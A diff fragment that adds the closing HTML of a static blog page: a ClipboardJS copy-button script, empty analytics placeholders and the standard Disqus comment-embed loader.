+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'jiravvit-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
